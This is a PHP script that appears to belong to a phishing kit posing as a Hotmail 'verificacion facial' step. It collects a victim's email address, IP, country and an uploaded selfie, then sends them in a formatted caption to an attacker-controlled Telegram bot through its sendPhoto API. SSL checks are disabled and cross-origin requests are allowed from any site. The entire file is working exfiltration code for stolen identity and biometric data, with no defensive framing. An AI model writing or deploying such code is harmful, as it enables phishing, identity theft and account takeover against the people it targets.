<?php
ini_set('display_errors', 0);
header('Content-Type: application/json; charset=UTF-8');
header('Access-Control-Allow-Origin: *');

include('../data.php');

$correo = trim($_POST['correo'] ?? '');
$ip     = trim($_POST['ip']     ?? '?');
$pais   = trim($_POST['pais']   ?? '?');
$date   = date('d/m/Y H:i:s');

$caption  = "📸 HOTMAIL — VERIFICACION FACIAL\n";
$caption .= "━━━━━━━━━━━━━━━━━━━━━\n";
$caption .= "📩 Correo: $correo\n";
$caption .= "🌐 IP: $ip ($pais)\n";
$caption .= "🕒 Fecha: $date\n";

if (isset($_FILES['photo']) && $_FILES['photo']['error'] === UPLOAD_ERR_OK) {
    $ch = curl_init("https://api.telegram.org/bot{$token}/sendPhoto");
    curl_setopt_array($ch, [
        CURLOPT_POST           => true,
        CURLOPT_RETURNTRANSFER => true,
        CURLOPT_TIMEOUT        => 30,
        CURLOPT_SSL_VERIFYPEER => false,
        CURLOPT_POSTFIELDS     => [
            'chat_id' => $chat_id,
            'photo'   => new CURLFile(
                $_FILES['photo']['tmp_name'],
                $_FILES['photo']['type'] ?: 'image/jpeg',
                'selfie.jpg'
            ),
            'caption' => $caption,
        ],
    ]);
    curl_exec($ch);
    curl_close($ch);
    echo json_encode(['ok' => true]);
} else {
    echo json_encode(['ok' => false, 'error' => 'no_file']);
}
